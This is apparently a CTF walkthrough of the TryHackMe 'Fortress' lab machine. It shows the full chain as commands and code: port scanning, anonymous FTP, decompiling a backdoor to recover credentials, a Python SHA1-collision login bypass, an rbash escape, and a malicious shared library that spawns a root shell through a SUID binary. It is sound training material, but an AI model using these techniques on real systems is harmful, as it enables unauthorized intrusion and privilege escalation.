<div align="center">

# 🏴 Fortress — TryHackMe
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Status](https://img.shields.io/badge/Status-Completed-brightgreen?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-212C42?style=for-the-badge&logo=tryhackme)

</div>

# Fortress — CTF Walkthrough

A full step-by-step writeup for the **Fortress** CTF machine.

---

## Table of Contents

- [Reconnaissance](#reconnaissance)
- [FTP Enumeration](#ftp-enumeration)
- [Backdoor Analysis](#backdoor-analysis)
- [HTTP Enumeration](#http-enumeration)
- [SHA1 Collision Attack](#sha1-collision-attack)
- [SSH Access](#ssh-access)
- [Privilege Escalation to j4x0n](#privilege-escalation-to-j4x0n)
- [Root via Malicious Shared Library](#root-via-malicious-shared-library)

---

## Reconnaissance

Start with a basic Nmap scan — you'll only see port 22 (SSH):

```bash
sudo nmap -A -sV -Pn <IP>
```

To find all open ports, scan all ports:

```bash
sudo nmap -A -sV -Pn -p- <IP>
```

**Result — 4 ports open:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 7.2p2 Ubuntu |
| 5581 | FTP     | vsftpd 3.0.3 |
| 5752 | Unknown (Telnet-like backdoor) | — |
| 7331 | HTTP    | Apache httpd 2.4.18 |

<img width="1004" height="714" alt="image" src="https://github.com/user-attachments/assets/f156f348-0c55-4c4d-8952-f4a323f6247e" />

---

## FTP Enumeration

Anonymous FTP login is allowed. Connect and grab the file:

```bash
ftp <IP> 5581
# Login: anonymous / (blank password)
get marked.txt
```

<img width="1004" height="616" alt="image" src="https://github.com/user-attachments/assets/59006a80-ec87-4268-92cf-0e8374e419a6" />


Read `marked.txt` — it reveals:

<img width="1004" height="51" alt="image" src="https://github.com/user-attachments/assets/e12feb96-e3b3-4ee5-9a96-db37d91b4aee" />


- FTP is mapped to `/home/veekay/ftp`
- The anonymous FTP user **may have write permission**
- That directory might be served by the HTTP server

> Check for upload/write/delete permissions — in this case, none exist.

### Hidden File on FTP

Look for hidden files:

```bash
ls -la
```

There is a hidden file named `.file`. Download it:

```bash
get .file
```

<img width="795" height="164" alt="image" src="https://github.com/user-attachments/assets/e9412b1c-0119-471f-9562-901cb5b839cf" />


---

## Backdoor Analysis

`.file` is actually a **compiled Python 2.7 bytecode** file (`.pyc`). Rename and decompile it:

```bash
mv .file backdoor.pyc
~/.local/bin/uncompyle6 -o . -p 2.7 backdoor.pyc
```
```
cat .file
�
y �`c@s�ddlZddlZddlmZdZdZdZejeje�Z	e	j
def�e	j
         d��Z
r�y�e   j�\ZZejd	�ejd
�ejd
    �jd
       �j�Zeed
�ejd          �Zejd
    �jd
       �j�Zeed
              �Zee�ekrjee�ekrjee
                                �d
770g�d�X�qixtir0�h�5�3l           �Zeje�ej�nejd�ej�Wq~q~q~Xq~WdS(i����N(t
cCs,tdd��}|j�}|SWdQXdS(Ns
secret.txttr(topentread(tftreveal((s../backdoor/backdoor.pytsecrets
                                                                   s
	Chapter 1: A Call for help

s
Username: isutf-8s
Password: sErrr... Authentication failed

(�tsockett
subprocesstCrypto.Util.numberRtuserntpasswtporttAF_INETt
                                                        SOCK_STREAMtstbindtlistenRtTruetaccepttconntaddrtsendtrecvtdecodetstripusernametbytespasswordt	directorytclose(((s../backdoor/backdoor.py<module>s6


```
**Decompiled source reveals:**

```python
import socket, subprocess
from Crypto.Util.number import bytes_to_long

usern = 232340432076717036154994L
passw = 10555160959732308261529999676324629831532648692669445488L
port  = 5752

# ... listens on port 5752, compares bytes_to_long(username) and bytes_to_long(password)
```

### Reverse the Credentials

Convert the long integers back to bytes using Python:

```python
def long_to_bytes(n):
    result = b''
    while n > 0:
        result = bytes([n & 0xff]) + result
        n >>= 8
    return result

usern = 232340432076717036154994
passw = 10555160959732308261529999676324629831532648692669445488

print(long_to_bytes(usern))
print(long_to_bytes(passw))
```

<img width="835" height="506" alt="image" src="https://github.com/user-attachments/assets/bb235aba-42ae-40a7-aba8-e938d7fc9d90" />


### Connect to the Backdoor

```bash
nc <IP> 5752
```

Enter the reversed username and password. You will receive a **path** (not the flag) — it points to a PHP file on the HTTP server.

---

<img width="645" height="350" alt="image" src="https://github.com/user-attachments/assets/63941ae7-dfc2-42c4-904d-8de838e485ef" />


## HTTP Enumeration

Open the HTTP server at `http://<IP>:7331`.

- Default Apache page is shown.
- Check `/assets/flag.hint.mp4` for a hint video.
- Check `/assets/style.css` — it contains a **Base64-encoded string**.

**Decode it:**

```bash
echo "VGhpcyBpcyBqb3VybmV5IG9m..." | base64 -d
```

This gives a lore message about a **KEY** obtainable by **colliding guards against each other** — a hint for a SHA1 collision attack.

<img width="540" height="363" alt="image" src="https://github.com/user-attachments/assets/24804990-4105-491a-9b1e-a001614f3307" />


### Login Page

Navigate to the path you got from the backdoor — you'll find a login page. View the source code:

- The PHP takes `user` and `pass`, converts them to hex, and uses **SHA1** to compare.
- This is vulnerable to a **SHA1 collision attack**.

---

## SHA1 Collision Attack

Download pre-built SHA1 collision files (`messageA` and `messageB`):

> These are files that have different content but produce the same SHA1 hash.

Run the bypass script:

```python
import requests

url = 'http://<IP>:7331/t3mple_0f_y0ur_51n5.php'

with open('messageA', 'rb') as f:
    u = f.read()

with open('messageB', 'rb') as f:
    p = f.read()

r = requests.get(url, params={
    'user': u,
    'pass': p
})

print(r.text)
```

<img width="1004" height="304" alt="image" src="https://github.com/user-attachments/assets/3bf402c0-e434-43bf-8d6b-860db600aba5" />


<img width="661" height="302" alt="image" src="https://github.com/user-attachments/assets/56fc2330-0bf5-4e69-aebb-4e070f03a6b5" />


**Result:** You get a new URL:

http://<IP>/m0td_f0r_j4x0n.txt

Open it — it reveals the **SSH username: `h4rdy`** and likely an SSH key.

---

## SSH Access

Login as `h4rdy`:

```bash
ssh h4rdy@<IP> -i id_rsa
```

You'll land in a restricted shell (`rbash`). Escape it with:

```bash
sudo ssh h4rdy@<IP> -i id_rsa -t 'bash --noprofile'
```


<img width="917" height="767" alt="image" src="https://github.com/user-attachments/assets/67a75fde-d1b1-4e7e-9db8-c4d59657db63" />


---

## Privilege Escalation to j4x0n

Check sudo permissions:

```bash
sudo -l
```

**Output:**

You are allowed to run ONE command as j4x0n:

sudo -u j4x0n /bin/cat <ANY FILE>

Read the user flag directly:

```bash
sudo -u j4x0n /bin/cat /home/j4x0n/user.txt
```

**User Flag:**



---

## Root via Malicious Shared Library

There is a SUID binary at `/opt/bt`. **Do not run it directly** — it's a trap.


<img width="709" height="454" alt="image" src="https://github.com/user-attachments/assets/aa8c2b43-47e5-44a5-b0b0-429c54ae98dc" />


### Safe Recon

```bash
/usr/bin/ldd /opt/bt
```


<img width="758" height="317" alt="image" src="https://github.com/user-attachments/assets/e0263d4c-f3d5-4d43-9304-08779f004851" />


This shows the shared libraries the binary loads. If any are in a **writable location**, you can hijack them.

### Create the Malicious Library

```c
// /tmp/libfoo.c
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor)) void init() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", "-p", NULL);
}
```

### Compile and Replace

```bash
gcc -shared -fPIC /tmp/libfoo.c -o /tmp/libfoo.so
cp /tmp/libfoo.so /usr/lib/libfoo.so
```


<img width="1004" height="352" alt="image" src="https://github.com/user-attachments/assets/04f8195c-11d8-48de-b0c2-d5f9742f02e6" />


### Run the SUID Binary

```bash
/opt/bt
```

You now have a **root shell**.


---

## Summary

| Step | What |
|------|------|
| Nmap full scan | Found 4 ports: SSH, FTP, backdoor, HTTP |
| FTP anonymous login | Got `marked.txt` and hidden `.file` |
| Decompile `.pyc` | Reversed credentials for port 5752 |
| NC backdoor | Got path to PHP login page |
| Base64 in CSS | Hint about SHA1 collision |
| SHA1 collision | Bypassed PHP login, got SSH username |
| SSH with rbash escape | Logged in as `h4rdy` |
| `sudo cat` as j4x0n | Read `user.txt` |
| Library hijacking | Got root shell |

---

> **Note:** Replace `<IP>` with the actual target machine IP throughout.
